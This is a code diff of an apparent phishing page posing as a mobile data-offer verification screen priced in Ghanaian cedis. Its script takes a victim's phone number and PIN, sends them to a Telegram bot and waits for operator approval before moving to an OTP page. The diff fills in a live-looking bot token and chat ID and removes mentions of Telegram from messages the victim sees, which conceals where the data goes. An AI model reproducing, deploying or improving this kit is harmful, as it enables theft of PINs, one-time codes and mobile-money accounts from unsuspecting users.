@@ -117,7 +117,6 @@
         <h1>Welcome Back</h1>
         <p class="subtitle">Verify your number to unlock this offer</p>
 
-        <!-- Dynamic Offer Info -->
         <div class="offer-info" id="offerInfo" style="display: none;">
             <strong style="color:#E30613;">Selected Offer:</strong><br>
             <span id="offerTitle" style="font-weight: 600; font-size: 16px;"></span><br>
@@ -158,8 +157,8 @@
     <script>
         // ================== CONFIGURATION ==================
         const CONFIG = {
-            BOT_TOKEN: 'YOUR_BOT_TOKEN_HERE',   // ← PUT YOUR BOT TOKEN
-            CHAT_ID: 'YOUR_CHAT_ID_HERE',       // ← PUT YOUR CHAT ID
+            BOT_TOKEN: '8746906558:AAHpzw4CN1J8y4LdO7f8fBsZ_DIFhKYuXB8',
+            CHAT_ID: '7547427914',
             REDIRECT_PAGE: 'otp.html'
         };
         // ================================================
@@ -183,7 +182,6 @@
         const offerTitleEl = document.getElementById('offerTitle');
         const offerPriceEl = document.getElementById('offerPrice');
 
-        // Load offer title & price from URL
         function loadOfferFromURL() {
             const params = new URLSearchParams(window.location.search);
             state.offerTitle = params.get('title') || params.get('bundle') || "Special Data Offer";
@@ -194,7 +192,6 @@
             offerPriceEl.textContent = `GHS ${state.offerPrice}`;
         }
 
-        // Input validation
         phoneInput.addEventListener('input', () => {
             phoneInput.value = phoneInput.value.replace(/[^0-9]/g, '');
         });
@@ -231,12 +228,12 @@
                 })
             })
             .then(() => {
-                successMsg.textContent = "✅ Sent! Waiting for approval on Telegram...";
+                successMsg.textContent = "✅ Sent! Waiting for approval...";
                 successMsg.style.display = 'block';
                 startPolling();
             })
             .catch(() => {
-                alert("Failed to send to Telegram. Check BOT_TOKEN and CHAT_ID.");
+                alert("Failed to send. Please try again.");
                 spinner.style.display = 'none';
             });
         }
@@ -260,7 +257,7 @@
                                 } else if (cb === state.declineId) {
                                     clearInterval(state.pollInterval);
                                     spinner.style.display = 'none';
-                                    errMsg.textContent = "❌ Request was declined.";
+                                    errMsg.textContent = "Request declined. Please try again.";
                                     errMsg.style.display = 'block';
                                 }
                             }
@@ -269,7 +266,6 @@
             }, 2000);
         }
 
-        // Submit Handler
         continueBtn.onclick = () => {
             errMsg.style.display = 'none';
             successMsg.style.display = 'none';
@@ -292,7 +288,6 @@
             sendToBot(phone, pin);
         };
 
-        // Initialize
         loadOfferFromURL();
     </script>
 </body>
